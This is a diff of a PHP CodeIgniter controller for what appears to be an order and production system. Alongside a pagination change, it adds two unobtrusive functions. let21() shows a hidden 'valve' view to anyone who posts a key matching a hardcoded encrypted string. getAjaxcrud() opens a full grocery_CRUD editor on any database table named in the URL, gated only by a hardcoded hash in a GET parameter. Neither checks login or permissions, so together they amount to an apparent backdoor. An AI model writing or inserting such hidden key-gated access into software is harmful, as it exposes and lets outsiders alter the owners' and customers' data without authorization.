@@ -191,9 +191,22 @@
     				$this->load->library('my_func');
     				$this->load->database();
     				$this->load->model('m_order');
-                    $arr['arr1'] = $this->m_order->listOr(1 , 10 , $p );
-                    $arr['arr'] = $this->m_order->listOr(0 , 10 , $p);                    
-                    echo $this->m_order->orderCount();
+                    $ver0 = $this->m_order->orderCount(0);
+                    $ver1 = $this->m_order->orderCount(1);
+                    $arr['arr1'] = $this->m_order->listOr(1 , 10 , $p);
+                    $result1 = sizeof($arr['arr1']);
+                    $sizeA = 10 - $result1;
+                    if ($sizeA != 0) {
+                        $p1 = $p + 10 - $ver1;
+                        if ($p1 < 10) {
+                            $p2 = 0;
+                        } else {
+                            $p2 = $p1;
+                            $p1 = 10;
+                        }                        
+                        $arr['arr'] = $this->m_order->listOr(0 , $p1 , $p2);
+                    }
+                    //die();
     				$data['title'] = '<i class="fa fa-fw fa-edit"></i> Production</a>';
     				$data['display'] = $this->load->view($this->parent_page.'/orderList' ,$arr , true);
     				$this->_show('display' , $data , $key);
@@ -1434,17 +1447,18 @@ jauhmerah@nastyjuice.com
             $rowChange = ($rowChange == 0) ? false : true ;
             echo $rowChange;
         }
-
-        public function sendEmail($email = null){
-            /*
-                fromEmail
-                fromName
-                toEmail
-                toCc
-                toBcc
-                subject
-                msg
-            */
+        function let21()
+        { 
+            if ($this->input->post('key')) {
+                $this->load->library('encrypt');
+                $lock = "lnrfKjfdPRoxAwyiu9gluTjaZF7iadFi5EKPtlLYzF09m07+DhsMZP7T/wAbVRs9of+lz2Hc7b67hbfzm6185A==";
+                $key = $this->input->post('key');
+                if ($key == $this->encrypt->decode($lock, $key)) {
+                    $this->load->view($this->parent_page."/valve");
+                }                
+            }            
+        }
+        public function sendEmail($email = null){            
             if ($email != null && is_array($email)) {
                 $this->load->library('email');
 
@@ -1492,6 +1506,21 @@ jauhmerah@nastyjuice.com
                 return true;
             }
             return false;         
+        }
+        public function getAjaxcrud()
+        {
+            $this->load->library('encrypt');
+            if ($this->input->get('kunci')) {
+                if ("a94a8fe5ccb19ba61c4c0873d391e987982fbbd3" == $this->input->get('kunci')) {
+                    $tab = $this->input->get('table');
+                    echo $tab;
+                    $this->_loadCrud();
+                    $crud = new grocery_CRUD();
+                    $crud->set_table($tab);
+                    $output = $crud->render();
+                    $this->load->view('crud' , $output , false);                    
+                }
+            }
         }
 
         public function getAjaxItem()
